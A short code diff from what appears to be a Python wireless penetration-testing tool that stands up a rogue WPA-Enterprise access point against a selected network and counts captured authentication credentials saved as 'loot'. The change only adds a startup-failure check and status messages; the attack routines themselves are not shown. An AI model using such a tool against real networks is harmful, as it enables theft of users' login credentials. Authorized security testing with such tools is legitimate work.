@@ -538,7 +538,9 @@ def main():
         if not ap_list: print("No WPA-Enterprise access points found",flush=True); return 0
         opts=[{"value":str(i),"label":f"{a['ssid']} · {a['bssid']}"} for i,a in enumerate(ap_list)]
         ap=ap_list[int(request_input("Select authorized target",input_type="select",choices=opts))]; _start_attack(ap)
-        print(f"Enterprise test AP active for {duration}s",flush=True); end=time.time()+duration
+        if not attack_running: print(f"Enterprise test AP failed to start on {_iface}",flush=True); return 1
+        print(f"Enterprise test AP: {ap['ssid']} · Interface: {_iface} · Gateway: {GATEWAY_IP}",flush=True)
+        print(f"Duration: {duration}s · Authentication loot: {LOOT_DIR}",flush=True); end=time.time()+duration
         while time.time()<end and attack_running: print(f"authentication_attempts={len(credentials)}",flush=True); time.sleep(5)
         return 0
     finally: running=False; _stop_attack()
